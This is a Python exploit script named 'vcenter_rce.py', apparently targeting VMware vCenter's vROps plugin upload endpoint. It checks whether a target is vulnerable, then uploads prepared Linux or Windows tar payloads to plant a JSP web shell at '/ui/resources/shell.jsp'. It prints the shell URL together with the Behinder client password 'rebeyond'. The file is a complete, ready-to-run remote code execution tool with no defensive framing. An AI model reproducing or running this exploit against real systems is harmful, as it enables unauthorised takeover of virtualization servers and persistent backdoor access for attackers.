#! /usr/bin/env python
# -*- coding:utf-8 -*-
#Author:gshell

import sys
import requests
import os
import urllib3

auth = """
   ___               _____        __         __   __
  / _ )  __ __      / ___/  ___  / /  ___   / /  / /
 / _  | / // /     / (_ /  (_-< / _ \/ -_) / /  / / 
/____/  \_, /      \___/  /___//_//_/\__/ /_/  /_/  
       /___/
====================================================
"""

urllib3.disable_warnings()

WORK_PATH = os.getcwd()

linux_exp = WORK_PATH + '/exp/Linux.tar'
win_exp = WORK_PATH + '/exp/Windows.tar'
# init vulnerable url and shell URL
vul_url = '/ui/vropspluginui/rest/services/uploadova'
shell_url = '/ui/resources/shell.jsp'

headers={}
headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0'


def checkVul(url):
    if url[-1] == '/':
        url = url[:-1].split('\n')[0]
    else:
        url = url.split('\n')[0]
    try:
        res = requests.get(url+vul_url, verify=False,timeout=5,headers=headers)
        if res.status_code == 405:
            print('[+] 目标可能存在漏洞：{}'.format(url))
            return True
        else:
            print('[-] {url} 目标不存在漏洞'.format(url=url))
            return False
    except:
        print('[-] {url} 目标连接失败'.format(url=url))
        return False



def checkShellExist(url):
    res = requests.get(url + shell_url, verify=False,timeout=5,headers=headers)
    # print(res.status_code)
    if res.status_code != 404:
        return True
    else:
        return False

def uploadWindowsPayload(url):
    if url[-1] == '/':
        url = url[:-1].split('\n')[0]
    else:
        url = url.split('\n')[0]
    
    print('[+] 测试win_exp')
    file = {'uploadFile': open(win_exp, 'rb')}
    re = requests.post(url + vul_url, files=file, verify=False,timeout=5,headers=headers)
    if 'SUCCESS' in re.text:
        if checkShellExist(url):
            print('[+] shell地址:: {url}, 冰蝎3，密码:rebeyond'.format(url=url + shell_url))
        else:
            print(
                '[-] All payload has been upload but not success.'
            )

def gshell(url):
    if url[-1] == '/':
        url = url[:-1].split('\n')[0]
    else:
        url = url.split('\n')[0]

    print('[+] 测试linux_exp')
    file = {'uploadFile': open(linux_exp, 'rb')}
    # print(url + vul_url)
    res = requests.post(url + vul_url, files=file, verify=False,timeout=5,headers=headers)
    # print (res.text)
    if 'SUCCESS' in res.text:
        print('[+] shell成功上传')
        if checkShellExist(url):
            print(
                '[+] shell地址: {url}, 冰蝎3，密码:rebeyond'.format(
                    url=url + shell_url))
        else:
            uploadWindowsPayload(url)
    else:
        uploadWindowsPayload(url)

if __name__ == "__main__":
    print(auth)

    if len(sys.argv) < 2:
        print("usage:python vcenter_rce.py -u website")
    else:
        url = sys.argv[sys.argv.index("-u")+1]
        # jar = sys.argv[sys.argv.index("-u")+3]
        if checkVul(url):
            gshell(url)
        # CVE_2020_17519(url)
        # rce(url)


# if __name__ == "__main__":
#     banner()
#     parser = argparse.ArgumentParser()
#     parser.add_argument(
#         "-url",
#         "--targeturl",
#         type=str,
#         help="Target URL. e.g: -url 192.168.2.1、-url https://192.168.2.1")
#     args = parser.parse_args()
#     url = args.targeturl
#     if 'https://' not in url:
#         url = 'https://' + url
#         if checkVul(url):
#             getshell(url)
#     elif checkVul(url):
#         getshell(url)
#     else:
#         parser.print_help()
